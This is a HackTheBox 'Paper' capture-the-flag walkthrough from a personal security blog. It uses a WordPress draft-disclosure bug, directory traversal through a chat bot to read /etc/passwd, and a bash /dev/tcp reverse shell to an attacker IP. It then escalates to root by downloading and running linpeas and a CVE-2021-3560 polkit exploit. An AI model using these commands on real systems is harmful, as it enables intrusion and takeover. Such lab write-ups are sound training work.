<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="PAPER (Linux) Walkthrough  Reconnaissance Let&amp;rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.143 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &amp;hellip;
 PORT 22 : running OpenSSH 8.0 (protocol 2.0) PORT 80/ 443 : running Apache httpd 2."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-paper/><title>HackTheBox: Paper :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Paper"><meta itemprop=description content="PAPER (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.143 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running OpenSSH 8.0 (protocol 2.0) PORT 80/ 443 : running Apache httpd 2."><meta itemprop=datePublished content="2022-05-25T00:00:00+00:00"><meta itemprop=dateModified content="2022-05-25T00:00:00+00:00"><meta itemprop=wordCount content="1040"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Paper"><meta name=twitter:description content="PAPER (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.143 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running OpenSSH 8.0 (protocol 2.0) PORT 80/ 443 : running Apache httpd 2."><meta property="og:title" content="HackTheBox: Paper"><meta property="og:description" content="PAPER (Linux) Walkthrough  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.143 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following result &mldr;
 PORT 22 : running OpenSSH 8.0 (protocol 2.0) PORT 80/ 443 : running Apache httpd 2."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-paper/"><meta property="article:published_time" content="2022-05-25T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-25T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-05-25 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>S3cur!ty_Bl0g</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-paper/>HackTheBox: Paper</a></h2><div class=post-content><h1 id=paper-linux-walkthrough>PAPER (Linux) Walkthrough</h1><p><img src=/assets/Pasted%20image%2020220211025247.png alt="assets/Pasted image 20220211025247.png"></p><hr><h1 id=reconnaissance>Reconnaissance</h1><p>Let&rsquo;s do a Quick Scan of the target using NMAP.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -O -oA nmap/initial 10.10.11.143
</code></pre></div><ul><li><strong>-sC</strong> : run Default Nmap scripts</li><li><strong>-sV</strong> : detects service versions</li><li><strong>-O</strong> : detects OS</li><li><strong>-oA</strong> : output all formats and store in file *nmap/initial</li></ul><p>We got the following result &mldr;</p><ul><li><strong>PORT 22</strong> : running OpenSSH 8.0 (protocol 2.0)</li><li><strong>PORT 80/ 443</strong> : running Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)</li></ul><p>we also find a domain name, Let&rsquo;s Put that in /etc/hosts file using.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.143 localhost.localdomain&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211025534.png alt="assets/Pasted image 20220211025534.png"></p><p>Let&rsquo;s do a Full machine scan to make sure we are not skipping any ports or services on uncommon ports.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sC -sV -O -oA nmap/full 10.10.11.143 -p-
</code></pre></div><p>Similarly Let&rsquo;s run a UDP Scan as well</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sU -O -p- -oA nmap/udp 10.10.11.143
</code></pre></div><p>There were no other open ports available.
I don&rsquo;t have results for both UDP/Full machine scan , as i forgot to backup them for writeup.</p><hr><h1 id=enumeration>Enumeration</h1><p>Port 22 is running openssh and doesn&rsquo;t seems to be vulnerable to any attack which can provide us access to target system, So its a good idea to target the services which may contain a large attack surface. So let&rsquo;s Enumerate on http/https ports.</p><h3 id=port-80443-apache-httpd-2437>Port 80/443 (Apache httpd 2.4.37)</h3><p>During name scan we found a hostname on ssl certificate, and we have already added that to our hosts file, If you didn&rsquo;t , add it now.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.143 localhost.localdomain&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Manually checking out the webpage , we just found a page which seems to be a default http server webpage.</p><p><img src=/assets/Pasted%20image%2020220211031241.png alt="assets/Pasted image 20220211031241.png"></p><p>Let&rsquo;s enumerate it further,</p><p>We can try following tools/enumeration steps to gain more info or to find more attacking surface.</p><ul><li>Brute Forcing Directories</li><li>Searching for Available Vulnerabilities to the apache version</li><li>Vulnerability Scanner Like Nikto.</li></ul><p>I have tried all three but only found relevant results in Nikto scanning.</p><p>If you don&rsquo;t have nikto install you can just clone the repo and run it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>git clone https://github.com/sullo/nikto <span style=color:#f92672>&amp;&amp;</span> cd nikto/program
</code></pre></div><p>Now we can run the Nikto on the target domain.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>perl nikto.pl -host http://localhost.localdomain
</code></pre></div><p>it takes a long time to scan . But we found relevant/useful result just after running it.
There is a uncommon header <code>x-backend-server</code> which give us a hostname <em>office.paper</em> .</p><p>Let&rsquo;s add the hostname to etc/hosts file,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.143 office.paper&#34;</span> &gt;&gt; /etc/hosts 
</code></pre></div><p><img src=/assets/Pasted%20image%2020220210034502.png alt="assets/Pasted image 20220210034502.png"></p><p>Its time to check out the hostname we found.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://office.paper/
</code></pre></div><p>Running whatweb or wapalyzer we found out that its a Wordpress Site Running version <em>Wordpress 5.2.3</em> .</p><p><img src=/assets/Pasted%20image%2020220211055126.png alt="assets/Pasted image 20220211055126.png"></p><p>Browsing through the site content , Found some interesting comments.</p><p><img src=/assets/Pasted%20image%2020220211055343.png alt="assets/Pasted image 20220211055343.png"></p><p>Seems Like Michael had posted some secret contents, Let&rsquo;s run a Wpscan to find if this wordpress version is vulnerable.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wpscan --url http://office.paper --disable-tls-checks --api-token &lt;API KEY&gt;
</code></pre></div><p>We found that this wordpress version has lot of viulnerabilities, Out of all we are interested in the <em>Unauthenticated View Private/Draft Posts</em> , Let&rsquo;s use this vulnerability to see the Drafted Posts By Michael.</p><p><img src=/assets/Pasted%20image%2020220210044647.png alt="assets/Pasted image 20220210044647.png"></p><p>According to the <a href=https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/>blog</a>, We can view all contect by appending <em>?static=1</em> , Let&rsquo;s try this..</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://office.paper/?static=1
</code></pre></div><p>We found a Secret Registration URL of Chat System, Let Try to register as a user.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://chat.office.paper/register/8qozr226AhkCHZdyY
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211060746.png alt="assets/Pasted image 20220211060746.png"></p><p>Let&rsquo;s Register and login to the chat system.</p><p><img src=/assets/Pasted%20image%2020220211061042.png alt="assets/Pasted image 20220211061042.png"></p><p>Reading through all the chats , We can figure out that there is a Bot Recyclops by dwight,
we can direct message the commands to bot, as we are not allowed to message in General chat room.</p><p>Going through the bot help command response , we can figure out that we are able to :</p><ul><li>List Directories (recyclops list)</li><li>Read Files (recyclops file)</li><li>Check Time (recyclops time)</li></ul><p><img src=/assets/Pasted%20image%2020220211061835.png alt="assets/Pasted image 20220211061835.png"></p><p>I have tried to get a reverse shell using these commands but none of them worked.
Injecting OS Command was not allowed through these above listed commands.</p><p>Also the chatbot was only allowed to read/list the contents of sales directory, So in order to read/list directories we have to bypass this, We can try <a href=https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt>these</a> Directory traversal payloads in order to bypass this limit.</p><p><img src=/assets/Pasted%20image%2020220211062555.png alt="assets/Pasted image 20220211062555.png"></p><p>I have tried few and below command worked to escape the directory limit.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>recyclops file ../../../..//etc/passwd
recyclops list ../../../..//home/dwight 
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211063244.png alt="assets/Pasted image 20220211063244.png"></p><p>From the dwight&rsquo;s directory , we can figure out that it is a hubot chatbot, Googling around i found that its an <a href=https://github.com/hubotio/hubot>open source</a> bot.
Going through the documentations we can figure out that the scripts which are responsible for running the various commands are located at <em>hubot/scripts/</em> Directory.</p><p>We can use the list command to list out the contents of this directory.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>recyclops list ../../../../..//home/dwight/hubot/scripts/
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211064436.png alt="assets/Pasted image 20220211064436.png"></p><p>We found a interesting script run.js ,
Checking the code of this file using <code>recyclops file ../../../../..//home/dwight/hubot/scripts/run.js</code></p><p>So Bot is also able to run commands , which was not mentioned in help command.</p><p><img src=/assets/Pasted%20image%2020220211064635.png alt="assets/Pasted image 20220211064635.png"></p><p>Let&rsquo;s try if we are really able to run a command.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>recyclops whoami &amp;&amp; id
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211064936.png alt="assets/Pasted image 20220211064936.png"></p><p>Now, We can use it to get a reverse shell to the target machine.</p><hr><h1 id=gaining-a-foothold>Gaining a foothold</h1><p>As we are already able to execute command on behalf of hubot.
Let&rsquo;s Use a reverse shell to gain access to target machine.</p><p>We will use reverse shell command,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>recyclops run bash -i &gt;&amp; /dev/tcp/10.10.14.4/5555 0&gt;&amp;1
</code></pre></div><p>Also , Dont&rsquo; forget to run a Netcat listener on that port 5555 before sending that command to bot in message.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nc -lnvp 5555
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211065620.png alt="assets/Pasted image 20220211065620.png"></p><p>We got the reverse shell as dwight user.</p><p><img src=/assets/Pasted%20image%2020220211065652.png alt="assets/Pasted image 20220211065652.png"></p><p>Let&rsquo;s Grab the user Flag.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>cat /home/dwight/user.txt
</code></pre></div><p><img src=/assets/Pasted%20image%2020220211065800.png alt="assets/Pasted image 20220211065800.png"></p><p>Also we do not have the permission to read the Root Flag , So we have to escalate the privilege.</p><hr><h1 id=privilege-escalation>Privilege Escalation</h1><p>Its time to escalate privillege, We can run the linpeas to find out the possible Privilege Escalation vectors.</p><p>Let&rsquo;s get the Linpeas from <a href=https://github.com/carlospolop/PEASS-ng/releases/tag/20220205>here</a>.
Host the linpeas script on attacker machine using http server and download it on target machine.</p><p>On attacker machine</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>python -m SimpleHTTPServer 9000
</code></pre></div><p>On Target Machine</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wget http://10.10.14.4:9000/linpeas.sh
</code></pre></div><p>Let&rsquo;s Run the linpeas on the target.
From the linpeas results we found out that the target is vulnerable to <em>CVE-2021-3560</em>.</p><p><img src=/assets/Pasted%20image%2020220211071424.png alt="assets/Pasted image 20220211071424.png"></p><p>Let&rsquo;s grab the exploit from this <a href=https://github.com/Almorabea/Polkit-exploit>repo</a> ,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wget https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py
</code></pre></div><p>Transfer the exploit using same method we transfere linpeas ,</p><p>Available exploit is written in python , and we also found that target has Python3 already installed , So we can use python3 to run the exploit.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>python3 CVE-2021-3560.py
</code></pre></div><p>We got the Root Access.</p><p><img src=/assets/Pasted%20image%2020220211075938.png alt="assets/Pasted image 20220211075938.png"></p><p>Let&rsquo;s Grab the Root Flag As well.</p><p><img src=/assets/Pasted%20image%2020220211080102.png alt="assets/Pasted image 20220211080102.png"></p><h6 id=thank-you-for-reading>Thank You For Reading</h6><hr></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>